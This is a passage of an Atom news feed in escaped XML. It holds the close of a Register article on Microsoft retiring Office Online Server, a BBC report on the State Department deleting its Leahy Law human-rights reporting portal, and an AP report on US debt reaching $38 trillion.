    &lt;p&gt;"With OOS [Office Online Server], you get the same functionality we offer with Office Online in your own datacenter."&lt;/p&gt;
    &lt;p&gt;There is currently no successor for Office Online Server. Few users may know it exists, but the fact that it is retiring is going to hurt those who prefer to keep data and processing on-premises without touching Office LTSC 2024. ®&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.theregister.com/2025/10/22/microsoft_office_online_server/"/><published>2025-10-23T14:15:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45682169</id><title>US axes website for reporting human rights abuses by US-armed foreign forces</title><updated>2025-10-23T15:37:56.449324+00:00</updated><content>&lt;doc fingerprint="fa44998e317b5382"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;US axes website for reporting human rights abuses by US-armed foreign forces&lt;/head&gt;
    &lt;p&gt;The US State Department has removed an online portal for reporting alleged human rights violations by foreign military units supplied with American weapons.&lt;/p&gt;
    &lt;p&gt;The Human Rights Reporting Gateway (HRG) acted as a formal "tip line" to the US government.&lt;/p&gt;
    &lt;p&gt;It was the only publicly accessible channel of its kind for organisations or individuals to inform it directly of potentially serious abuses by US-armed foreign forces.&lt;/p&gt;
    &lt;p&gt;Its deletion has been condemned by human rights campaigners and by a senior congressional aide who drafted the law requiring it. The State Department insisted it was still abiding by the law.&lt;/p&gt;
    &lt;p&gt;The portal was established in 2022 following pressure on successive administrations to abide by updated provisions of the Leahy Law, named after former US Senator Patrick Leahy. These require the government to "facilitate receipt" of information on alleged gross violations of human rights by military units supplied by Washington.&lt;/p&gt;
    &lt;p&gt;Among the cases submitted via the HRG was the alleged excessive use of force by security forces during anti-government protests in Colombia, while several cases were due to be submitted relating to US-armed units of the Israel Defense Forces (IDF) in the occupied West Bank, according to Amnesty International.&lt;/p&gt;
    &lt;p&gt;Tim Rieser, former senior aide to Senator Leahy who wrote the 2011 amendment mandating information gathering, told the BBC the gateway's removal meant the State Department was "clearly ignoring the law".&lt;/p&gt;
    &lt;p&gt;He added it was a further sign that "the entire human rights architecture" within the department was being "rendered largely ineffective".&lt;/p&gt;
    &lt;p&gt;"The United States will find itself supporting foreign security forces that commit heinous crimes even though nothing is done about it," said Mr Rieser. "As a result there will be less incentive for foreign governments to bring people who commit such crimes to justice."&lt;/p&gt;
    &lt;p&gt;In response, the US State Department insisted it was continuing to receive reports regarding gross violations of human rights and was engaging with "credible organisations" on a full spectrum of human rights concerns. It said: "The Department abides by its legal requirements".&lt;/p&gt;
    &lt;p&gt;Secretary of State Marco Rubio has overseen a sweeping reorganisation of the State Department involving widespread layoffs and eliminating some offices focused on human rights monitoring. The department this year released a slimmed-down annual human rights report which critics said omitted alleged crimes by US allies but included those by foreign leaders the Trump administration opposes.&lt;/p&gt;
    &lt;p&gt;The department has previously said its restructure made it leaner and more efficient and followed President Trump's "America First" foreign policy which sees some human rights promotion as ideologically driven.&lt;/p&gt;
    &lt;p&gt;Charles Blaha, former Director of the Office of Security and Human Rights at the State Department, said people in the field would now have "no established channel" for reporting gross violations of human rights by foreign security forces.&lt;/p&gt;
    &lt;p&gt;The government's ability to deter abuses was "severely weakened", said Mr Blaha who is now an adviser to the Washington-based think tank Democracy for the Arab World Now (DAWN).&lt;/p&gt;
    &lt;p&gt;The BBC learned during the summer that the HRG site was earmarked for deletion. Its removal was highlighted by DAWN in August but has not previously been acknowledged by the State Department. The BBC confirmed this week that officials phased out the reporting channel during the department's restructure.&lt;/p&gt;
    &lt;p&gt;Screengrabs of the portal taken by the BBC before its deletion show it asked for information on US-armed foreign military units involved in alleged abuses including extrajudicial killings, forced disappearances, torture and rape. It required extensive details to ensure credible reporting including unit names, identities of alleged perpetrators, specific locations and dates.&lt;/p&gt;
    &lt;p&gt;Blaha had already voiced frustration that despite the HRG passing its pilot phase, the Biden administration had not done enough to publicise it, meaning the provision to "facilitate receipt" of information was still not being fully honoured before the Trump administration deleted the channel entirely.&lt;/p&gt;
    &lt;p&gt;The US is the world's biggest contributor of military aid to foreign countries, supplying funding, equipment, training and arms to more than 150 nations. Its vetting procedures to prevent arms going to units involved in breaches of international law have evolved over the years, with the 1997 legislation named after Senator Leahy being one its major pillars.&lt;/p&gt;
    &lt;p&gt;At the heart of the law is Congress sending a message to the administration that taxpayer funding cannot support human rights abuses abroad, says Amanda Klasing, who oversees government relations at Amnesty International USA.&lt;/p&gt;
    &lt;p&gt;"If I'm a member of Congress, my perspective is: 'I want to protect my constituents and their taxpayer funding from going to torturers or people that kill their own citizens for protesting," she told the BBC.&lt;/p&gt;
    &lt;p&gt;Klasing oversaw the compilation and submission of several reports to the Human Rights Reporting Gateway.&lt;/p&gt;
    &lt;p&gt;These included allegations that American arms were used by Colombian security forces during mass anti-government protests in 2021, in which at least 47 people were killed and many wounded according to the group. Amnesty says among the arms were US-supplied high-capacity launchers for stun and smoke grenades.&lt;/p&gt;
    &lt;p&gt;Klasing says she had also gathered evidence relating to the killing of 20 Palestinians during IDF raids in occupied East Jerusalem and the West Bank in October and November 2023. Amnesty was preparing to submit its report on these incidents to the HRG before its deletion.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bbc.com/news/articles/cqx30vnwd4do"/><published>2025-10-23T14:25:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45682671</id><title>US hits $38T in debt. Fastest accumulation of $1T outside pandemic</title><updated>2025-10-23T15:37:56.095882+00:00</updated><content>&lt;doc fingerprint="bd40bc8447b787e9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;US hits $38 trillion in debt, after the fastest accumulation of $1 trillion outside of the pandemic&lt;/head&gt;
    &lt;p&gt;WASHINGTON (AP) — In the midst of a federal government shutdown, the U.S. government’s gross national debt surpassed $38 trillion Wednesday, a record number that highlights the accelerating accumulation of debt on America’s balance sheet.&lt;/p&gt;
    &lt;p&gt;It’s also the fastest accumulation of a trillion dollars in debt outside of the COVID-19 pandemic — the U.S. hit $37 trillion in gross national debt in August this year.&lt;/p&gt;
    &lt;p&gt;The $38 trillion update is found in the latest Treasury Department report, which logs the nation’s daily finances.&lt;/p&gt;
    &lt;p&gt;Kent Smetters of the University of Pennsylvania’s Penn Wharton Budget Model, who served in President George W. Bush’s Treasury Department, told The Associated Press that a growing debt load over time leads ultimately to higher inflation, eroding Americans’ purchasing power.&lt;/p&gt;
    &lt;p&gt;The Government Accountability Office outlines some of the impacts of rising government debt on Americans — including higher borrowing costs for things like mortgages and cars, lower wages from businesses having less money available to invest, and more expensive goods and services.&lt;/p&gt;
    &lt;p&gt;“I think a lot of people want to know that their kids and grandkids are going to be in good, decent shape in the future — that they will be able to afford a house,” Smetters said. “That additional inflation compounds” and erodes consumers’ purchasing power, he said, making it less possible for future generations to achieve home ownership goals.&lt;/p&gt;
    &lt;p&gt;The Trump administration says its policies are helping to slow government spending and will shrink the nation’s massive deficit. A new analysis by Treasury Department officials states that from April to September, the cumulative deficit totaled $468 billion. In a post on X Wednesday, Treasury Secretary Scott Bessent said that’s the lowest reading since 2019.&lt;/p&gt;
    &lt;p&gt;“During his first eight months in office, President Trump has reduced the deficit by $350 billion compared to the same period in 2024 by cutting spending and boosting revenue,” White House spokesman Kush Desai said in a statement, adding that the administration would pursue robust economic growth, lower inflation, tariff revenue, lower borrowing costs and cuts to waste, fraud and abuse.&lt;/p&gt;
    &lt;p&gt;The Joint Economic Committee estimates that the total national debt has grown by $69,713.82 per second for the past year.&lt;/p&gt;
    &lt;p&gt;Michael Peterson, chair and CEO of the Peter G. Peterson Foundation, said in a statement that “reaching $38 trillion in debt during a government shutdown is the latest troubling sign that lawmakers are not meeting their basic fiscal duties.”&lt;/p&gt;
    &lt;p&gt;“Along with increasing debt, you get higher interest costs, which are now the fastest growing part of the budget,” Peterson added. “We spent $4 trillion on interest over the last decade, but will spend $14 trillion in the next ten years. Interest costs crowd out important public and private investments in our future, harming the economy for every American.”&lt;/p&gt;
    &lt;p&gt;The U.S. hit $34 trillion in debt in January 2024, $35 trillion in July 2024 and $36 trillion in November 2024.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://apnews.com/article/trump-treasury-debt-ceiling-bessent-09575f13ca95c2f1beb38234b2cbe85b"/><published>2025-10-23T15:03:05+00:00</published></entry></feed>